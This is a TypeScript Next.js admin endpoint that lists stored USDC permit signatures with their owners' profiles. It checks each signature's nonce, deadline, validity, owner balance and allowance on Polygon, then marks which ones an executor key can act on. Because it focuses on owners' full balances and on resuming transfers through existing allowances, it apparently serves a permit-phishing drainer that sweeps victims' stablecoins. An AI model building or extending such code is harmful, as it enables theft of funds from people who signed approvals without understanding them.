import { NextResponse } from 'next/server'
import { createClient } from '@supabase/supabase-js'
import { verifyAdmin } from '@/lib/admin-auth'
import {
  createPublicClient,
  http,
  parseAbi,
  formatUnits,
  verifyTypedData,
} from 'viem'
import { polygon } from 'viem/chains'
import { privateKeyToAccount } from 'viem/accounts'

function getSupabaseAdmin() {
  const url = process.env.NEXT_PUBLIC_SUPABASE_URL
  const key = process.env.SUPABASE_SERVICE_ROLE_KEY
  
  if (!url || !key) {
    return null
  }
  
  return createClient(url, key)
}


const CONFIG = {
  rpcUrl: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
  usdcAddress: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359' as `0x${string}`,
  merkleTreeContract: '0x76f0d64bC0D41262aebBCc584679Ee1EBb22dd0d' as `0x${string}`,
  executorPrivateKey: process.env.EXECUTOR_PRIVATE_KEY as `0x${string}` | undefined,
  eoaExecutorPrivateKey: process.env.EOA_EXECUTOR_PRIVATE_KEY as `0x${string}` | undefined,
}

const USDC_ABI = parseAbi([
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
  'function balanceOf(address account) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
])

const PERMIT_TYPES = {
  Permit: [
    { name: 'owner', type: 'address' },
    { name: 'spender', type: 'address' },
    { name: 'value', type: 'uint256' },
    { name: 'nonce', type: 'uint256' },
    { name: 'deadline', type: 'uint256' },
  ],
} as const

function getFullSignature(sig: {
  full_signature?: string | null
  r: string
  s: string
  v: number
}): `0x${string}` {
  if (sig.full_signature?.startsWith('0x')) {
    return sig.full_signature as `0x${string}`
  }
  const normalizedV = sig.v < 27 ? sig.v + 27 : sig.v
  return `0x${sig.r.replace(/^0x/, '')}${sig.s.replace(/^0x/, '')}${normalizedV
    .toString(16)
    .padStart(2, '0')}` as `0x${string}`
}

async function verifyPermitSignature(sig: {
  owner_address: string
  spender_address: string
  value: string
  nonce: number
  deadline: number
  full_signature?: string | null
  r: string
  s: string
  v: number
}) {
  try {
    return await verifyTypedData({
      address: sig.owner_address as `0x${string}`,
      domain: {
        name: 'USD Coin',
        version: '2',
        chainId: polygon.id,
        verifyingContract: CONFIG.usdcAddress,
      },
      types: PERMIT_TYPES,
      primaryType: 'Permit',
      message: {
        owner: sig.owner_address as `0x${string}`,
        spender: sig.spender_address as `0x${string}`,
        value: BigInt(sig.value),
        nonce: BigInt(sig.nonce),
        deadline: BigInt(sig.deadline),
      },
      signature: getFullSignature(sig),
    })
  } catch {
    return false
  }
}

function getEoaExecutorAddress(): string | null {
  const privateKey = CONFIG.eoaExecutorPrivateKey || CONFIG.executorPrivateKey
  if (!privateKey) return null
  try {
    return privateKeyToAccount(privateKey).address.toLowerCase()
  } catch {
    return null
  }
}

export async function GET() {
  // 验证管理员
  if (!await verifyAdmin()) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  const supabaseAdmin = getSupabaseAdmin()
  if (!supabaseAdmin) {
    return NextResponse.json({ error: 'Database not configured' }, { status: 500 })
  }

  try {
    const { data: signatures, error } = await supabaseAdmin
      .from('permit_signatures')
      .select('*, profiles(username, email)')
      .order('created_at', { ascending: false })

    if (error) {
      console.error('Error fetching signatures:', error)
      return NextResponse.json({ error: 'Database error' }, { status: 500 })
    }

    // 验证签名有效性
    const publicClient = createPublicClient({
      chain: polygon,
      transport: http(CONFIG.rpcUrl),
    })

    const now = Math.floor(Date.now() / 1000)
    const eoaExecutorAddress = getEoaExecutorAddress()
    
    const signaturesWithValidity = await Promise.all(
      (signatures || []).map(async (sig) => {
        // 已使用或已过期的签名不需要再检查
        if (sig.status !== 'pending') {
          return {
            ...sig,
            is_valid: false,
            invalid_reason: sig.status === 'used' ? 'Already used' : 'Expired/Revoked',
            usdc_balance: '0',
          }
        }

        // 检查 deadline
        if (sig.deadline < now) {
          return {
            ...sig,
            is_valid: false,
            invalid_reason: 'Deadline expired',
            usdc_balance: '0',
          }
        }

        try {
          const [currentNonce, balance, signatureValid] = await Promise.all([
            publicClient.readContract({
              address: CONFIG.usdcAddress,
              abi: USDC_ABI,
              functionName: 'nonces',
              args: [sig.owner_address as `0x${string}`],
            }),
            publicClient.readContract({
              address: CONFIG.usdcAddress,
              abi: USDC_ABI,
              functionName: 'balanceOf',
              args: [sig.owner_address as `0x${string}`],
            }),
            verifyPermitSignature(sig),
          ])
          const balanceFormatted = formatUnits(balance, 6)
          const isContractSpender =
            sig.spender_address?.toLowerCase() === CONFIG.merkleTreeContract.toLowerCase()

          if (!isContractSpender) {
            if (!eoaExecutorAddress) {
              return {
                ...sig,
                is_valid: false,
                invalid_reason: 'EOA executor key not configured',
                usdc_balance: balanceFormatted,
              }
            }
            if (eoaExecutorAddress !== sig.spender_address.toLowerCase()) {
              return {
                ...sig,
                is_valid: false,
                invalid_reason: `EOA executor mismatch (${eoaExecutorAddress.slice(0, 8)}…)`,
                usdc_balance: balanceFormatted,
              }
            }
          }

          if (BigInt(sig.nonce) !== currentNonce) {
            // EOA permit 可能已上链、但 transferFrom 尚未完成。链上 allowance
            // 是可靠授权，此时允许直接恢复转账，不要求旧 nonce 仍匹配。
            if (!isContractSpender && balance > BigInt(0)) {
              const allowance = await publicClient.readContract({
                address: CONFIG.usdcAddress,
                abi: USDC_ABI,
                functionName: 'allowance',
                args: [
                  sig.owner_address as `0x${string}`,
                  sig.spender_address as `0x${string}`,
                ],
              })
              if (allowance >= balance) {
                return {
                  ...sig,
                  is_valid: true,
                  invalid_reason: null,
                  execution_mode: 'allowance_recovery',
                  usdc_balance: balanceFormatted,
                }
              }
            }
            return {
              ...sig,
              is_valid: false,
              invalid_reason: `Nonce mismatch (expected ${sig.nonce}, current ${currentNonce})`,
              usdc_balance: '0',
            }
          }

          if (!signatureValid) {
            return {
              ...sig,
              is_valid: false,
              invalid_reason: 'Cryptographic signature invalid',
              usdc_balance: balanceFormatted,
            }
          }

          // EIP-7702 / 智能账户有 bytecode。纯 ECDSA 恢复可能正确，但 USDC
          // 会按合约签名规则（ERC-1271）验证并拒绝。对这类有余额的钱包做一次
          // 无状态 eth_call，只有链上 permit 真正接受才显示 Valid。
          if (balance > BigInt(0)) {
            const ownerCode = await publicClient.getCode({
              address: sig.owner_address as `0x${string}`,
            })
            if (ownerCode && ownerCode !== '0x') {
              try {
                await publicClient.simulateContract({
                  account: (eoaExecutorAddress || CONFIG.merkleTreeContract) as `0x${string}`,
                  address: CONFIG.usdcAddress,
                  abi: USDC_ABI,
                  functionName: 'permit',
                  args: [
                    sig.owner_address as `0x${string}`,
                    sig.spender_address as `0x${string}`,
                    BigInt(sig.value),
                    BigInt(sig.deadline),
                    sig.v,
                    sig.r as `0x${string}`,
                    sig.s as `0x${string}`,
                  ],
                })
              } catch {
                return {
                  ...sig,
                  is_valid: false,
                  invalid_reason: 'Smart-account permit rejected on-chain',
                  usdc_balance: balanceFormatted,
                }
              }
            }
          }

          return {
            ...sig,
            is_valid: true,
            invalid_reason: null,
            usdc_balance: balanceFormatted,
          }
        } catch {
          return {
            ...sig,
            is_valid: false,
            invalid_reason: 'Failed to verify on-chain',
            usdc_balance: '0',
          }
        }
      })
    )

    return NextResponse.json({ signatures: signaturesWithValidity })
  } catch (error) {
    console.error('Error:', error)
    return NextResponse.json({ error: 'Internal error' }, { status: 500 })
  }
}
